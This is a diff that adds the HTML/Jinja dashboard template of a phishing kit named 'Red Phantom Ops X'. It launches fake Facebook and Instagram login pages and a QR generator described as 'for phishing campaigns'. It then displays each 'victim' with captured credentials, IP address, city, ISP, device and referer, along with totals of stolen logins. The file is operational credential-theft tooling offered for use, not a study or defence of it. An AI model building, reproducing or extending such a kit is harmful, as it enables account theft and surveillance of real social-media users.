@@ -1,0 +1,659 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Red Phantom Ops X - Dashboard</title>
+    <link rel="icon" href="../../tools/frontend/images/Red Phantom.png" />
+    <style>
+      :root {
+        --primary-red: #ff0000;
+        --dark-red: #b30000;
+        --black: #000000;
+        --dark-gray: #111111;
+        --gray: #222222;
+        --light-gray: #333333;
+        --text: #ffffff;
+        --text-muted: #cccccc;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        background: var(--black);
+        color: var(--text);
+        font-family: "Segoe UI", "Roboto", sans-serif;
+        line-height: 1.6;
+        min-height: 100vh;
+      }
+
+      .header {
+        background: linear-gradient(
+          135deg,
+          var(--black) 0%,
+          var(--dark-red) 100%
+        );
+        padding: 2rem 0;
+        border-bottom: 3px solid var(--primary-red);
+        box-shadow: 0 5px 30px rgba(255, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .header::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          var(--primary-red),
+          transparent
+        );
+      }
+
+      .container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 0 2rem;
+      }
+
+      .header-content {
+        text-align: center;
+      }
+
+      .header h1 {
+        font-size: 3rem;
+        margin-bottom: 0.5rem;
+        background: linear-gradient(45deg, var(--text), var(--primary-red));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        text-shadow: 0 2px 10px rgba(255, 0, 0, 0.3);
+        letter-spacing: 1px;
+      }
+
+      .header p {
+        color: var(--text-muted);
+        font-size: 1.1rem;
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      .dashboard-controls {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+        gap: 1.5rem;
+        margin: 3rem 0;
+      }
+
+      .control-card {
+        background: var(--gray);
+        border-radius: 12px;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        border: 1px solid var(--light-gray);
+        height: 100%;
+      }
+
+      .control-card:hover {
+        transform: translateY(-5px);
+        border-color: var(--primary-red);
+        box-shadow: 0 10px 30px rgba(255, 0, 0, 0.2);
+      }
+
+      .platform-header {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        padding: 1.5rem;
+        background: var(--dark-gray);
+        border-bottom: 2px solid var(--primary-red);
+      }
+
+      .platform-icon {
+        width: 50px;
+        height: 50px;
+        border-radius: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.5rem;
+        background: var(--black);
+      }
+
+      .facebook-icon {
+        background: linear-gradient(135deg, #1877f2, #0d5cb6);
+        color: white;
+      }
+
+      .instagram-icon {
+        background: linear-gradient(45deg, #833ab4, #e1306c, #fd1d1d);
+        color: white;
+      }
+
+      .qr-icon {
+        background: linear-gradient(
+          135deg,
+          var(--primary-red),
+          var(--dark-red)
+        );
+        color: white;
+      }
+
+      .platform-header h3 {
+        font-size: 1.5rem;
+        margin: 0;
+      }
+
+      .control-content {
+        padding: 1.5rem;
+      }
+
+      .control-content p {
+        color: var(--text-muted);
+        margin-bottom: 1.5rem;
+        min-height: 60px;
+      }
+
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        background: linear-gradient(
+          135deg,
+          var(--primary-red),
+          var(--dark-red)
+        );
+        color: white;
+        text-decoration: none;
+        padding: 0.8rem 1.5rem;
+        border-radius: 8px;
+        font-weight: 600;
+        border: none;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        width: 100%;
+        text-align: center;
+      }
+
+      .btn:hover {
+        background: linear-gradient(
+          135deg,
+          var(--dark-red),
+          var(--primary-red)
+        );
+        transform: translateY(-2px);
+        box-shadow: 0 5px 20px rgba(255, 0, 0, 0.4);
+      }
+
+      .stats-section {
+        margin: 3rem 0;
+      }
+
+      .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 1.5rem;
+        margin-bottom: 3rem;
+      }
+
+      .stat-card {
+        background: linear-gradient(135deg, var(--gray), var(--dark-gray));
+        padding: 2rem;
+        border-radius: 12px;
+        text-align: center;
+        border: 1px solid var(--light-gray);
+        transition: all 0.3s ease;
+      }
+
+      .stat-card:hover {
+        border-color: var(--primary-red);
+        transform: translateY(-3px);
+      }
+
+      .stat-number {
+        font-size: 3.5rem;
+        font-weight: 800;
+        background: linear-gradient(45deg, var(--primary-red), #ff4444);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        margin: 0.5rem 0;
+        text-shadow: 0 2px 10px rgba(255, 0, 0, 0.3);
+      }
+
+      .stat-label {
+        color: var(--text-muted);
+        font-size: 0.9rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+      }
+
+      .victims-section {
+        background: var(--dark-gray);
+        border-radius: 15px;
+        padding: 2rem;
+        margin: 3rem 0;
+        border: 1px solid var(--light-gray);
+      }
+
+      .section-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 2rem;
+        padding-bottom: 1rem;
+        border-bottom: 2px solid var(--primary-red);
+      }
+
+      .section-header h2 {
+        font-size: 2rem;
+        background: linear-gradient(45deg, var(--text), var(--primary-red));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+
+      .victims-list {
+        display: flex;
+        flex-direction: column;
+        gap: 1.5rem;
+      }
+
+      .victim-card {
+        background: var(--gray);
+        border-radius: 10px;
+        padding: 1.5rem;
+        border-left: 4px solid var(--primary-red);
+        transition: all 0.3s ease;
+        border: 1px solid var(--light-gray);
+      }
+
+      .victim-card:hover {
+        transform: translateX(5px);
+        border-color: var(--primary-red);
+        box-shadow: 0 5px 20px rgba(255, 0, 0, 0.1);
+      }
+
+      .victim-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 1rem;
+        flex-wrap: wrap;
+        gap: 1rem;
+      }
+
+      .victim-id {
+        color: var(--primary-red);
+        font-weight: 700;
+        font-size: 1.2rem;
+      }
+
+      .victim-meta {
+        display: flex;
+        gap: 1.5rem;
+        flex-wrap: wrap;
+        margin: 1rem 0;
+      }
+
+      .meta-item {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        color: var(--text-muted);
+        font-size: 0.9rem;
+      }
+
+      .credential-box {
+        background: rgba(255, 0, 0, 0.1);
+        border: 1px solid var(--primary-red);
+        border-radius: 8px;
+        padding: 1rem;
+        margin: 1rem 0;
+        font-family: "Courier New", monospace;
+        color: #ff6666;
+        word-break: break-all;
+      }
+
+      .no-data {
+        text-align: center;
+        padding: 4rem 2rem;
+        color: var(--text-muted);
+      }
+
+      .no-data-icon {
+        font-size: 4rem;
+        margin-bottom: 1rem;
+        opacity: 0.5;
+      }
+
+      .scroll-top {
+        position: fixed;
+        bottom: 2rem;
+        right: 2rem;
+        background: var(--primary-red);
+        color: white;
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        border: none;
+        font-size: 1.5rem;
+        z-index: 1000;
+        transition: all 0.3s ease;
+      }
+
+      .scroll-top:hover {
+        background: var(--dark-red);
+        transform: translateY(-3px);
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 0 1rem;
+        }
+
+        .header h1 {
+          font-size: 2rem;
+        }
+
+        .dashboard-controls {
+          grid-template-columns: 1fr;
+        }
+
+        .victim-header {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+
+        .victim-meta {
+          flex-direction: column;
+          gap: 0.5rem;
+        }
+      }
+
+      .status-indicator {
+        display: inline-block;
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: var(--primary-red);
+        margin-right: 0.5rem;
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.5;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+
+      .footer {
+        text-align: center;
+        padding: 2rem;
+        color: var(--text-muted);
+        border-top: 1px solid var(--light-gray);
+        margin-top: 3rem;
+        font-size: 0.9rem;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="container">
+        <div class="header-content">
+          <h1>RED PHANTOM OPS X</h1>
+          <p>Advanced Intelligence Dashboard • Real-time Monitoring System</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="dashboard-controls">
+        <div class="control-card">
+          <div class="platform-header">
+            <div class="platform-icon facebook-icon">
+              <span>f</span>
+            </div>
+            <h3>Facebook</h3>
+          </div>
+          <div class="control-content">
+            <p>
+              Advanced Facebook phishing page with modern UI and session
+              management
+            </p>
+            <a href="/facebook" class="btn">
+              <span>⚡</span> Launch Facebook Page
+            </a>
+          </div>
+        </div>
+
+        <div class="control-card">
+          <div class="platform-header">
+            <div class="platform-icon instagram-icon">
+              <span>📷</span>
+            </div>
+            <h3>Instagram</h3>
+          </div>
+          <div class="control-content">
+            <p>
+              Instagram login replica with enhanced credential capture system
+            </p>
+            <a href="/instagram" class="btn">
+              <span>⚡</span> Launch Instagram Page
+            </a>
+          </div>
+        </div>
+
+        <div class="control-card">
+          <div class="platform-header">
+            <div class="platform-icon qr-icon">
+              <span>QR</span>
+            </div>
+            <h3>QR Generator</h3>
+          </div>
+          <div class="control-content">
+            <p>
+              Generate custom QR codes for phishing campaigns and link
+              distribution
+            </p>
+            <a href="/qr" class="btn"> <span>⚡</span> Generate QR Codes </a>
+          </div>
+        </div>
+      </div>
+
+      {% if victims %}
+      <div class="stats-section">
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-number">{{ victims|length }}</div>
+            <div class="stat-label">Total Victims</div>
+          </div>
+
+          {% set with_creds = 0 %} {% for victim in victims %} {% if
+          victim.credentials != 'Page visited' %} {% set with_creds = with_creds
+          + 1 %} {% endif %} {% endfor %}
+
+          <div class="stat-card">
+            <div class="stat-number">{{ with_creds }}</div>
+            <div class="stat-label">Credentials Captured</div>
+          </div>
+
+          {% set fb_count = 0 %} {% for victim in victims %} {% if
+          victim.platform == 'facebook' %} {% set fb_count = fb_count + 1 %} {%
+          endif %} {% endfor %}
+
+          <div class="stat-card">
+            <div class="stat-number">{{ fb_count }}</div>
+            <div class="stat-label">Facebook Visits</div>
+          </div>
+
+          {% set ig_count = 0 %} {% for victim in victims %} {% if
+          victim.platform == 'instagram' %} {% set ig_count = ig_count + 1 %} {%
+          endif %} {% endfor %}
+
+          <div class="stat-card">
+            <div class="stat-number">{{ ig_count }}</div>
+            <div class="stat-label">Instagram Visits</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="victims-section">
+        <div class="section-header">
+          <h2>Victim Intelligence</h2>
+          <div style="display: flex; align-items: center; gap: 1rem">
+            <span class="status-indicator"></span>
+            <span>Live Monitoring</span>
+          </div>
+        </div>
+
+        <div class="victims-list">
+          {% for victim in victims %}
+          <div class="victim-card">
+            <div class="victim-header">
+              <div>
+                <span class="victim-id">#{{ victim.id }}</span>
+                <span
+                  style="
+                    margin-left: 1rem;
+                    padding: 0.3rem 0.8rem;
+                    background: var(--light-gray);
+                    border-radius: 20px;
+                    font-size: 0.8rem;
+                    text-transform: uppercase;
+                  "
+                >
+                  {{ victim.platform }}
+                </span>
+              </div>
+              <span style="color: var(--text-muted); font-size: 0.9rem">
+                {{ victim.timestamp }}
+              </span>
+            </div>
+
+            <div class="victim-meta">
+              <div class="meta-item">
+                <span>🌐</span>
+                <span><strong>IP:</strong> {{ victim.ip }}</span>
+              </div>
+              <div class="meta-item">
+                <span>📍</span>
+                <span
+                  ><strong>Location:</strong> {{ victim.city }}, {{
+                  victim.country }}</span
+                >
+              </div>
+              <div class="meta-item">
+                <span>🔧</span>
+                <span><strong>ISP:</strong> {{ victim.isp }}</span>
+              </div>
+            </div>
+
+            {% if victim.credentials != 'Page visited' %}
+            <div class="credential-box">
+              <strong>🔐 CAPTURED CREDENTIALS:</strong><br />
+              {{ victim.credentials }}
+            </div>
+            {% else %}
+            <div
+              style="
+                background: rgba(255, 255, 255, 0.05);
+                padding: 1rem;
+                border-radius: 6px;
+                color: var(--text-muted);
+              "
+            >
+              <span>👁️ Page visited - No credentials entered</span>
+            </div>
+            {% endif %}
+
+            <div class="victim-meta" style="margin-top: 1rem">
+              <div class="meta-item">
+                <span>🖥️</span>
+                <span
+                  ><strong>Device:</strong> {{ victim.user_agent[:80]
+                  }}...</span
+                >
+              </div>
+              <div class="meta-item">
+                <span>🔗</span>
+                <span><strong>Referer:</strong> {{ victim.referer }}</span>
+              </div>
+            </div>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+      {% else %}
+      <div class="no-data">
+        <div class="no-data-icon">🕵️‍♂️</div>
+        <h3 style="margin: 1rem 0; color: var(--text-muted)">
+          No Active Sessions
+        </h3>
+        <p style="margin-bottom: 2rem">
+          Start by deploying phishing pages to collect intelligence
+        </p>
+        <a href="/qr" class="btn" style="width: auto; padding: 1rem 2rem">
+          <span>🚀</span> Begin Operation
+        </a>
+      </div>
+      {% endif %}
+    </div>
+
+    <button
+      class="scroll-top"
+      onclick="window.scrollTo({ top: 0, behavior: 'smooth' })"
+    >
+      ↑
+    </button>
+
+    <div class="footer">
+      <div class="container">
+        <p>Red Phantom Ops X Dashboard • Secure Monitoring Interface</p>
+      </div>
+    </div>
+
+    <script>
+      const scrollButton = document.querySelector(".scroll-top");
+
+      window.addEventListener("scroll", () => {
+        if (window.scrollY > 300) {
+          scrollButton.style.display = "flex";
+        } else {
+          scrollButton.style.display = "none";
+        }
+      });
+
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "F5") {
+          location.reload();
+        }
+        if (e.ctrlKey && e.key === "r") {
+          e.preventDefault();
+          location.reload();
+        }
+      });
+
+      setTimeout(() => {
+        location.reload();
+      }, 30000);
+    </script>
+  </body>
+</html>
